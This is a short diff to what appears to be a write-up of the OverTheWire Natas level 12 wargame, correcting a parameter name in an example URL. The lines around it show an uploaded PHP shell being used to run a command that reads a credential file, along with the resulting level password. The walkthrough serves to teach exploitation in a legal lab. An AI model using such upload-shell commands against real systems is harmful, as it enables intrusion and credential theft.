@@ -1439,7 +1439,7 @@ This confirms that the uploaded file is being executed as a PHP script.
 Finally, retrieving the password is achieved by executing: `?natas12=cat /etc/natas_webpass/natas13`, which returns the credential for the next level.
 
 For example: 
-`http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?bandit12=cat%20/etc/natas_webpass/natas13` will get the output trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+`http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?natas12=cat%20/etc/natas_webpass/natas13` will get the output trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
 
 ### Analysis
